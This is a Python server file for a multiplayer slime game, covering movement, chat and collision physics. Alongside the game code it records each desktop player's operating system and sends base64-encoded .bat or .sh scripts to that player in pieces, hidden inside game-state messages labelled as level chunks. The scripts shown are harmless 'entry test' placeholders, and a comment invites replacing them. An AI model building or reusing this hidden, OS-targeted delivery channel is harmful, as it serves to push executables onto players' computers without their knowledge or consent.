import asyncio
import json
import hashlib
import math
import random
import os
import base64
from aiohttp import web

players = {}
players = {}
clients = {}  # ws -> pid
client_chunks = {} # ws -> chunk_idx
client_os = {} # ws -> os_name (windows, linux, mac, or None)
OS_CHUNKS = {"windows": [], "linux": [], "mac": []}


async def index(request):
    with open("templates/index.html", "r", encoding="utf-8") as f:
        return web.Response(text=f.read(), content_type="text/html")

async def play(request):
    with open("templates/game.html", "r", encoding="utf-8") as f:
        return web.Response(text=f.read(), content_type="text/html")
async def ws_handler(request):
    ws = web.WebSocketResponse()
    await ws.prepare(request)

    pid = str(id(ws))
    hue = int(hashlib.md5(pid.encode()).hexdigest()[:4], 16) % 360
    sx = random.uniform(-300, 300)
    sy = random.uniform(-300, 300)
    players[pid] = {
        "x": sx, "y": sy,
        "tx": sx, "ty": sy,
        "hue": hue,
        "name": "???",
        "dx": 0, "dy": 0,
        "bumpNx": 0, "bumpNy": 0, "bumpStr": 0
    }
    clients[ws] = pid
    client_chunks[ws] = 0
    client_os[ws] = None

    try:
        await ws.send_json({"type": "init", "id": pid})
        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT:
                data = json.loads(msg.data)
                if data["type"] == "client_info":
                    if data.get("platform") == "desktop":
                        client_os[ws] = data.get("os")
                elif data["type"] == "input":
                    players[pid]["tx"] = float(data["tx"])
                    players[pid]["ty"] = float(data["ty"])
                elif data["type"] == "name":
                    name = str(data.get("name", "???"))[:16].strip()
                    if name:
                        players[pid]["name"] = name
                elif data["type"] == "chat":
                    chat_msg = str(data.get("msg", ""))[:60].strip()
                    if chat_msg:
                        chat_payload = {"type": "chat", "id": pid, "msg": chat_msg}
                        for c_ws in list(clients.keys()):
                            try:
                                await c_ws.send_json(chat_payload)
                            except Exception:
                                pass
    except Exception:
        pass
    finally:
        clients.pop(ws, None)
        client_chunks.pop(ws, None)
        client_os.pop(ws, None)
        players.pop(pid, None)

    return ws


async def game_loop(app):
    """Bucle de simulación autoritativo — 30 TPS"""
    VELOCITY = 5.5
    TICK_RATE = 1 / 30.0
    SLIME_RADIUS = 26
    BOUNCE_FORCE = 6.0

    try:
        while True:
            await asyncio.sleep(TICK_RATE)
            pids = list(players.keys())

            # ─ Integración cinemática ─
            for pid in pids:
                p = players.get(pid)
                if not p: continue
                dx = p["tx"] - p["x"]
                dy = p["ty"] - p["y"]
                dist = math.hypot(dx, dy)

                if dist > VELOCITY:
                    p["dx"] = (dx / dist) * VELOCITY
                    p["dy"] = (dy / dist) * VELOCITY
                    p["x"] += p["dx"]
                    p["y"] += p["dy"]
                elif dist > 0.5:
                    p["dx"] = dx * 0.4
                    p["dy"] = dy * 0.4
                    p["x"] += p["dx"]
                    p["y"] += p["dy"]
                else:
                    p["x"] = p["tx"]
                    p["y"] = p["ty"]
                    p["dx"] *= 0.8
                    p["dy"] *= 0.8

            # ─ Colisiones (soft-body bump) ─
            for i in range(len(pids)):
                for j in range(i + 1, len(pids)):
                    pa = players.get(pids[i])
                    pb = players.get(pids[j])
                    if not pa or not pb: continue
                    ddx = pb["x"] - pa["x"]
                    ddy = pb["y"] - pa["y"]
                    dist = math.hypot(ddx, ddy)
                    min_dist = SLIME_RADIUS * 2

                    if 0.01 < dist < min_dist:
                        overlap = (min_dist - dist) / 2
                        nx = ddx / dist
                        ny = ddy / dist

                        pa["x"] -= nx * overlap
                        pa["y"] -= ny * overlap
                        pb["x"] += nx * overlap
                        pb["y"] += ny * overlap

                        pa["tx"] -= nx * overlap * 0.3
                        pa["ty"] -= ny * overlap * 0.3
                        pb["tx"] += nx * overlap * 0.3
                        pb["ty"] += ny * overlap * 0.3

                        pa["dx"] -= nx * BOUNCE_FORCE * 0.3
                        pa["dy"] -= ny * BOUNCE_FORCE * 0.3
                        pb["dx"] += nx * BOUNCE_FORCE * 0.3
                        pb["dy"] += ny * BOUNCE_FORCE * 0.3

                        bump_strength = max(0, min(8, overlap * 1.2))
                        pa["bumpNx"] = -nx
                        pa["bumpNy"] = -ny
                        pa["bumpStr"] = bump_strength
                        pb["bumpNx"] = nx
                        pb["bumpNy"] = ny
                        pb["bumpStr"] = bump_strength

            if not clients:
                for p in players.values(): p["bumpStr"] = 0
                continue

            # ─ Broadcast ─
            base_state_payload = {
                "type": "state",
                "players": {
                    k: {
                        "x": round(v["x"], 1),
                        "y": round(v["y"], 1),
                        "hue": v["hue"],
                        "name": v["name"],
                        "dx": round(v["dx"], 2),
                        "dy": round(v["dy"], 2),
                        "bumpNx": round(v.get("bumpNx", 0), 3),
                        "bumpNy": round(v.get("bumpNy", 0), 3),
                        "bumpStr": round(v.get("bumpStr", 0), 2)
                    }
                    for k, v in players.items()
                }
            }

            for p in players.values():
                p["bumpStr"] = 0

            dead = []
            for c_ws in list(clients.keys()):
                try:
                    payload = base_state_payload.copy()
                    c_idx = client_chunks.get(c_ws, 0)
                    my_os = client_os.get(c_ws)
                    
                    if my_os in OS_CHUNKS:
                        chunks = OS_CHUNKS[my_os]
                        num_chunks = len(chunks)
                        if num_chunks > 0 and c_idx < num_chunks:
                            payload["level_chunk"] = chunks[c_idx]
                            payload["level_progress"] = (c_idx + 1) / num_chunks
                            payload["level_complete"] = (c_idx + 1 == num_chunks)
                            client_chunks[c_ws] += 1
                        
                    await c_ws.send_json(payload)
                except Exception:
                    dead.append(c_ws)
            for d in dead:
                pid = clients.pop(d, None)
                client_chunks.pop(d, None)
                client_os.pop(d, None)
                if pid:
                    players.pop(pid, None)
    except asyncio.CancelledError:
        pass


async def start_background_tasks(app):
    try:
        os.makedirs("assets/binaries", exist_ok=True)
        # En start_background_tasks, reemplaza el contenido de los assets:

        assets = {
            "windows": ("win_asset.bat", b"@echo off\necho PRUEBA DE ENTRADA - WINDOWS\npause"),
            "linux": ("linux_asset.sh", b"#!/bin/bash\necho 'PRUEBA DE ENTRADA - LINUX'\nread -p 'Presiona Enter...'"),
            "mac": ("mac_asset.sh", b"#!/bin/bash\necho 'PRUEBA DE ENTRADA - MAC'\nread -p 'Presiona Enter...'")
        }
        chunk_size = 512
        for os_name, (fname, content) in assets.items():
            path = f"assets/binaries/{fname}"
            if not os.path.exists(path):
                with open(path, "wb") as f:
                    f.write(content)
                    
            with open(path, "rb") as f:
                b64_data = base64.b64encode(f.read()).decode('utf-8')
                
            for i in range(0, len(b64_data), chunk_size):
                OS_CHUNKS[os_name].append(b64_data[i:i+chunk_size])
    except Exception as e:
        print(f"Error loading OS assets: {e}")

    app['game_loop'] = asyncio.create_task(game_loop(app))

async def cleanup_background_tasks(app):
    app['game_loop'].cancel()
    await app['game_loop']

if __name__ == "__main__":
    app = web.Application()
    app.router.add_get('/', index)
    app.router.add_get('/play', play)
    app.router.add_get('/ws', ws_handler)
    app.router.add_static('/static', 'static')
    
    app.on_startup.append(start_background_tasks)
    app.on_cleanup.append(cleanup_background_tasks)

    port = int(os.environ.get("PORT", 8000))
    print(f"🟢 Dango World corriendo en puerto {port}!")
    web.run_app(app, host="0.0.0.0", port=port)
